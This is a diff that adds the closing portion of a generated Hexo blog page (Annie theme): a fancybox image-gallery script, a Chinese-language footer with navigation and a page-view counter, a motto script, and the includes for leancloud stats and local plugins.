+		let postTitle = titleID.text() ? titleID.text() : "No post title!";
+		
+		imageID.each(function() {
+			let imgPath = $(this).attr('src'),
+				imgTitle = $(this).attr('alt') ? $(this).attr('alt') : "No image description!";
+		
+			//给每个匹配的<img>元素打包, 即添加父元素<a>
+			$(this).wrap('<a data-fancybox="gallery" data-caption="《 ' + postTitle + ' 》' + imgTitle + '"href="' + imgPath + '"> </a>');
+		});
+		
+		videoID.each(function() {
+			let videoPath = $(this).attr('src');
+		
+			//给每个匹配的<img>元素打包, 即添加父元素<a>
+			$(this).wrap('<a data-fancybox href=" ' + videoPath + ' "> </a>');
+		});
+		
+		//TODO：支持html5 video
+
+		if($('#layout-post').length) {
+			$('[data-fancybox="gallery"]').fancybox({
+				loop: true,
+				buttons: [
+					"zoom",
+					"share",
+					"slideShow",
+					"fullScreen",
+					//"download",
+					"thumbs",
+					"close"
+				],
+				protect: true
+			});
+		}
+	})();
+</script>
+		</main>
+
+		<!--footer-->
+		<footer>
+	<div id="navigation-show">
+		<ul id="global-nav">
+	
+		<li class="menu-home">
+			<a href="/" class="menu-item-home" target="_blank">主页</a>
+		</li>
+		
+	
+		<li class="menu-archive">
+			<a href="/archives" class="menu-item-archive" target="_blank">归档</a>
+		</li>
+		
+	
+		<li class="menu-categories">
+			<a href="/categories" class="menu-item-categories" target="_blank">分类</a>
+		</li>
+		
+	
+		<li class="menu-tags">
+			<a href="/tags" class="menu-item-tags" target="_blank">标签</a>
+		</li>
+		
+	
+		<li class="menu-Friends!">
+			<a href="/friends" class="menu-item-Friends!" target="_blank">Friends!</a>
+		</li>
+		
+	
+		<li class="menu-gallery">
+			<a href="/gallery" class="menu-item-gallery" target="_blank">相册</a>
+		</li>
+		
+	
+
+	
+</ul>
+	</div>
+
+	<div class="copyright">
+		<p>
+			 
+				&copy;2024, content by Infernity. All Rights Reserved.
+			
+			
+				<a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a> Theme <a href="https://github.com/Sariay/hexo-theme-Annie" title="Annie" target="_blank" rel="noopener">Annie</a> by Sariay.
+			
+		</p>
+		<p>
+			
+
+	<!-- busuanzi -->
+	<!-- busuanzi -->
+
+		
+	<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+	
+
+		<span id="busuanzi_container_page_pv">
+	  		本文总阅读量<span id="busuanzi_value_page_pv"></span>次
+		</span>
+
+	
+
+
+
+
+			<a href="javascript:zh_tran('s');" class="zh_click" id="zh_click_s">简体</a> 
+			<a href="javascript:zh_tran('t');" class="zh_click" id="zh_click_t">繁體</a>				
+		</p>
+	</div>		
+</footer>
+		
+	<!-- Local or hitokoto! -->
+
+	
+<script src="/plugin/motto/motto.js"></script>
+
+	
+	<script type="text/javascript">
+		(function motto(){
+			let mottoText = getMingYanContent().split('</br> - </br>'),
+			
+			mottoTextContent = mottoText[0]?mottoText[0]:'请刷新...',
+			
+			mottoTextFrom = mottoText[1]?mottoText[1]:'one/一个';
+			
+			mottoTextContent = mottoTextContent.trim().substring(0, 100);
+		
+			$("#motto-content").html( mottoTextContent);
+			$("#motto-author").html( mottoTextFrom  );
+		})();	
+	</script>	
+
+
+
+<!-- love effect -->
+
+	
+<script src="/plugin/love/love.js"></script>
+
+
+
+<!-- back to top -->
+
+	<div id="totop">
+	<span class="icon-circle-up"></span>
+</div>
+
+
+
+<!-- site analysis -->
+
+
+	<!-- site-analysis -->
+	
+	
+	
+	
+	
+ 
+
+<!-- leancloud -->
+
+
+	<!-- leancloud -->
+	<!--
+	时间：2018-11-27
+	描述：
+		文章访问量：visitors
+		文章喜欢量：likes	
+		文章排行榜：topNPost
+		其他得说明：
+			01-Cookie相关的函数 
+				https://blog.csdn.net/somehow1002/article/details/78511541（Author：somehow1002）
+			02-visitors相关的函数 
+				https://blog.csdn.net/u013553529/article/details/63357382（Author：爱博客大伯）
+				https://notes.doublemine.me/2015-10-21-为NexT主题添加文章阅读量统计功能.html（Author：夏末）
+			03-topNPost相关的函数
+				https://hoxis.github.io/hexo-next-read-rank.html（Author：hoxis）
+			04-likes相关的函数，
+				参考了01 & 02进行简单的设计与实现
+-->
+
+
+  
+<script src="/plugin/leancloud/av-min.js"></script>
+<script src="/js/leancloud-count.js"></script>
+
+
+	
+
+  
+
+
+
+<script src="/plugin/chinese/chinese.js"></script>
+<script src="/plugin/imagelazyloader/yall.min.js"></script>
+<script src="/plugin/imageloaded/imagesloaded.pkgd.min.js"></script>
+<script src="/plugin/nicescroll/jquery.nicescroll.js"></script>
+<script src="/plugin/resizediv/resizediv.js"></script>
+<script src="/js/main.js"></script>
+
+	</body>	
+</html>
